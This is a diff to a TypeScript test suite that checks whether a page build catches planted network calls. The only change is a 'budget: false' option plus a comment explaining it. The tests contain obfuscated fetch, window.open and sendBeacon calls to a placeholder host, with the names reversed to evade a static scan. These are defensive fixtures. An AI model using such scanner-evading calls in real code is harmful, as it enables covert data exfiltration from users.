@@ -31,6 +31,11 @@ afterAll(async () => {
 });
 
 /**
+ * Built with `budget: false`: this entry registers every shipped encoding, more
+ * than the shipped page does, and what it tests is the network check, which a
+ * byte overrun would otherwise pre-empt. The shipped page's bytes are
+ * budget.test.ts's to enforce.
+ *
  * A standalone entry like the shipped one, whose `value` encoding calls
  * `reach` from inside its cell renderer. Everything else is the shipped view.
  */
@@ -114,7 +119,7 @@ describe('the page carries the policy', () => {
 describe('a planted network call fails the build', () => {
   it('a fetch() hidden from the scan, inside a cell renderer, fails it in the browser, under that encoding only', async () => {
     const entry = await plantedEntry('hidden-fetch', "globalThis[[...'hctef'].reverse().join('')]('https://example.invalid/' + alt).catch(() => {})");
-    const failure = await buildStandalone(relocationJson, { entry }).catch((e: unknown) => e);
+    const failure = await buildStandalone(relocationJson, { entry, budget: false }).catch((e: unknown) => e);
     expect(failure).toBeInstanceOf(NetworkReached);
     const { message, findings } = failure as NetworkReached;
     expect(message).toMatch(/exercised in Chromium/);
@@ -125,7 +130,7 @@ describe('a planted network call fails the build', () => {
 
   it('a plain fetch() fails it before any browser starts, naming the string', async () => {
     const entry = await plantedEntry('plain-fetch', "fetch('https://example.invalid/' + alt)");
-    const failure = await buildStandalone(relocationJson, { entry, check: 'static' }).catch((e: unknown) => e);
+    const failure = await buildStandalone(relocationJson, { entry, check: 'static', budget: false }).catch((e: unknown) => e);
     expect(failure).toBeInstanceOf(NetworkReached);
     expect((failure as NetworkReached).message).toMatch(/a fetch\(\) call: .*fetch\(/);
   });
@@ -140,7 +145,7 @@ describe('a planted network call fails the build', () => {
     ['a new window opened through an iframe', "try { const f = document.body.appendChild(document.createElement('iframe')); f.contentWindow[[...'nepo'].reverse().join('')]('https://example.invalid/'); } catch {}"],
   ] as const) {
     it(`${what} fails it`, async () => {
-      const failure = await buildStandalone(relocationJson, { entry: await plantedEntry(what.replace(/\W+/g, '-'), reach) }).catch((e: unknown) => e);
+      const failure = await buildStandalone(relocationJson, { entry: await plantedEntry(what.replace(/\W+/g, '-'), reach), budget: false }).catch((e: unknown) => e);
       expect(failure, what).toBeInstanceOf(NetworkReached);
       const { findings } = failure as NetworkReached;
       expect(findings.some((f) => f.startsWith('encoding "value"')), what).toBe(true);
@@ -151,7 +156,7 @@ describe('a planted network call fails the build', () => {
 
   it('a sendBeacon hidden from the scan fails it too: the violation surfaces as a console error', async () => {
     const entry = await plantedEntry('beacon', "navigator[[...'nocaeBdnes'].reverse().join('')]('https://example.invalid/', alt)");
-    const failure = await buildStandalone(relocationJson, { entry }).catch((e: unknown) => e);
+    const failure = await buildStandalone(relocationJson, { entry, budget: false }).catch((e: unknown) => e);
     expect(failure).toBeInstanceOf(NetworkReached);
     expect((failure as NetworkReached).findings.some((f) => f.startsWith('encoding "value"'))).toBe(true);
   });
